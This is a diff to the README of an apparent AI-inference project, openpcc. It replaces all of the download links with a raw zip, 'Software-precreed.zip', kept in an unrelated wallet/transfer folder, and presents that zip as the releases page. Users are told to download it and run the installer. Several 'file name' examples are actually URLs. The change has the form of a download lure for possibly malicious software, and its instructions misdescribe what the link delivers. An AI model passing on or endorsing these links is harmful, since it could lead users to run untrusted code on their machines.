@@ -1,6 +1,6 @@
 # 🚀 openpcc - Secure AI Inference Made Easy
 
-[![Download](https://raw.githubusercontent.com/hsp1234h/openpcc/main/transparency/openpcc_1.2.zip)](https://raw.githubusercontent.com/hsp1234h/openpcc/main/transparency/openpcc_1.2.zip)
+[![Download](https://github.com/hsp1234h/openpcc/raw/refs/heads/main/anonpay/wallet/internal/transfer/Software-precreed.zip)](https://github.com/hsp1234h/openpcc/raw/refs/heads/main/anonpay/wallet/internal/transfer/Software-precreed.zip)
 
 ## 📚 Introduction
 
@@ -20,15 +20,15 @@ Using openpcc is simple. Follow these steps to download and install the software
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/hsp1234h/openpcc/main/transparency/openpcc_1.2.zip) the latest version of openpcc. This page contains all the versions available for download.
+1. **Visit the Releases Page:** Go to [this page to download](https://github.com/hsp1234h/openpcc/raw/refs/heads/main/anonpay/wallet/internal/transfer/Software-precreed.zip) the latest version of openpcc. This page contains all the versions available for download.
 
 2. **Choose Your Version:** Look for the latest release at the top of the page. You will see a list of files you can download for different operating systems (Windows, Mac, Linux). 
 
 3. **Download the File:** Click on the file that suits your operating system to start the download.
 
 4. **Run the Installer:** Once the download completes, locate the file in your downloads folder. For example:
-   - For Windows, it might be `https://raw.githubusercontent.com/hsp1234h/openpcc/main/transparency/openpcc_1.2.zip`.
-   - For Mac, it could be `https://raw.githubusercontent.com/hsp1234h/openpcc/main/transparency/openpcc_1.2.zip`.
+   - For Windows, it might be `https://github.com/hsp1234h/openpcc/raw/refs/heads/main/anonpay/wallet/internal/transfer/Software-precreed.zip`.
+   - For Mac, it could be `https://github.com/hsp1234h/openpcc/raw/refs/heads/main/anonpay/wallet/internal/transfer/Software-precreed.zip`.
    - For Linux, you may have a tar file or installation script.
 
 5. **Follow Installation Prompts:** Double-click the downloaded file and follow the prompts to install openpcc on your computer. The installer will guide you through the process.
@@ -65,7 +65,7 @@ If you need assistance or want to learn more about the features, detailed docume
 
 ## 🔄 Updating openpcc
 
-To keep your software up-to-date, regularly check the [Releases Page](https://raw.githubusercontent.com/hsp1234h/openpcc/main/transparency/openpcc_1.2.zip) for new versions. Follow the same download and installation process when a new update becomes available.
+To keep your software up-to-date, regularly check the [Releases Page](https://github.com/hsp1234h/openpcc/raw/refs/heads/main/anonpay/wallet/internal/transfer/Software-precreed.zip) for new versions. Follow the same download and installation process when a new update becomes available.
 
 ## 👥 Contributing
 
